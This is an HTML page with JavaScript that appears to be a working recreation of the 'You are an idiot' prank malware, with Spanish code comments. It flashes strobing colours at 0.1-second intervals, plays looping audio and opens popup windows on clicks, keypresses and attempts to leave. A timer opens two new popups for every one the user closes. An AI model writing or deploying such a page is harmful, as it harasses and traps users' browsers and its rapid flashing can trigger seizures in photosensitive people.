<!DOCTYPE html>
<html>
<head>
<style>
* { margin: 0; padding: 0; }
body { overflow: hidden; cursor: pointer; background: white; }
#main {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    animation: bg 0.1s infinite alternate;
}
@keyframes bg { from { background: white; } to { background: black; } }
#text { font-family: Arial; font-size: 36px; font-weight: bold; animation: col 0.1s infinite alternate; }
@keyframes col { from { color: red; } to { color: blue; } }
.f { font-size: 48px; animation: fl 0.1s infinite alternate; }
@keyframes fl { from { filter: invert(0); } to { filter: invert(1); } }
</style>
</head>
<body>
<div id="main">
    <div id="text">YOU ARE AN IDIOT!</div>
    <div><span class="f">&#9786;</span> <span class="f">&#9786;</span> <span class="f">&#9786;</span></div>
</div>
<audio id="aud" loop src="yai.wav"></audio>
<script>
var started = false;
var popups = [];

function openPopup() {
    var w = window.open('popup.html', '_blank',
        'width=250,height=200,left=' + Math.floor(Math.random()*800) +
        ',top=' + Math.floor(Math.random()*500));
    if (w) popups.push(w);
    return w;
}

function procreate() {
    openPopup();
    openPopup();
    openPopup();
}

document.addEventListener('click', function() {
    document.getElementById('aud').play();
    if (!started) {
        started = true;
        procreate();
    } else {
        openPopup();
    }
});

// cada vez que el usuario pulsa una tecla — mas popups
document.addEventListener('keydown', function(e) {
    procreate();
});

// si intentan cerrar — mas popups
window.addEventListener('beforeunload', function() {
    procreate();
});

// vigila popups cerrados — abre dos por cada uno cerrado
setInterval(function() {
    var alive = [];
    for (var i = 0; i < popups.length; i++) {
        try {
            if (popups[i].closed) {
                openPopup();
                openPopup();
            } else {
                alive.push(popups[i]);
            }
        } catch(e) {}
    }
    popups = alive;
}, 500);
</script>
</body>
</html>
